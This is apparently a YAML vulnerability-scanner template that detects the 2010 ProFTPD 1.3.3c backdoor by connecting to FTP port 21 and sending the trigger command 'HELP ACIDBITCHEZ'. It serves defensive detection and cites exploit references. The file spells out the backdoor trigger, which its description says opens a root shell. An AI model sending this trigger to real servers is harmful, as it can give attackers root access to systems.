id: CVE-2010-20103

info:
  name: ProFTPD 1.3.3c Backdoor - Command Injection
  author: intelligent-ears
  severity: critical
  description: |
    A backdoor was inserted into ProFTPD 1.3.3c between Nov 28 - Dec 2, 2010.
    Sending HELP ACIDBITCHEZ triggers a shell with root privileges.
  reference:
    - http://www.proftpd.org/
    - https://advisories.checkpoint.com/defense/advisories/public/2011/cpai-2010-151.html/
    - https://github.com/proftpd/proftpd
    - https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/unix/ftp/proftpd_133c_backdoor.rb
    - https://web.archive.org/web/20111107212129/http://rsync.proftpd.org/
    - https://www.exploit-db.com/exploits/15662
    - https://www.exploit-db.com/exploits/16921
    - https://www.vulncheck.com/advisories/proftpd-backdoor-command-execution
  classification:
    cve-id: CVE-2010-20103
    cwe-id: CWE-912
  tags: cve,cve2010,proftpd,rce,backdoor,network

network:
  - host:
      - "{{Hostname}}:21"

    inputs:
      - data: "HELP ACIDBITCHEZ\r\n"

    read-size: 1024

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "220 ProFTPD 1.3.3c"

      - type: word
        words:
          - "502 Unknown command"
        negative: true

    extractors:
      - type: regex
        regex:
          - "220 ProFTPD ([0-9.]+[a-z]?)"
